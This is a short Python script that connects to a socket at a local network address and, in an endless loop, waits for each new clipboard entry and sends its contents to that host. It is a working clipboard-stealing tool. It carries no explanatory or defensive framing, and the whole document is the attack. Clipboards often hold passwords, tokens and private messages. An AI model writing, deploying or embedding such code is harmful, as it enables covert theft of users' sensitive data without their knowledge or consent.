import socket
import pyperclip as ppc
c=socket.socket()
c.connect(('192.168.1.89',9989))

def data():
   text=ppc.waitForNewPaste()
   return text
    


while True:
    c.send(bytes(data(),'utf-8'))
    
        